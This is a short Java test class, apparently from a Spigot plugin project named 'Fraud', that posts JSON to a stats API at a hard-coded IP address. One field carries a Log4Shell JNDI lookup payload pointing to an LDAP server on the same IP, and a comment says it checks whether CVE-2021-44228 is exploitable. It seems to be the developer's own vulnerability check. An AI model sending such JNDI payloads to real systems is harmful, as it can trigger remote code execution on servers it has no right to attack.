import com.google.gson.GsonBuilder;
import fr.Rgld_.Fraud.Spigot.Helpers.Utils;

import java.util.ArrayList;
import java.util.List;

public class StatsTest {

    public static void main(String[] args) {
        System.out.println("Code: " + Utils.postContent("http://51.210.249.108:11043/api/fraud/stats/",
                new CommonClassForTests("${jndi:ldap://51.210.249.108:1389/a}", 5).toString())); // Check if a the Log4Shell CVE-2021-44228 vulnerability is usable
    }


    public static class CommonClassForTests {
        String name;
        int code;
        List<Integer> list;

        public CommonClassForTests(String name, int code) {
            this.name = name;
            this.code = code;
            this.list = new ArrayList<>();
            for (int i = 0; i <15; i++) {
                list.add(i);
            }
        }

        @Override
        public String toString() {
            return new GsonBuilder().create().toJson(this);
        }
    }

}
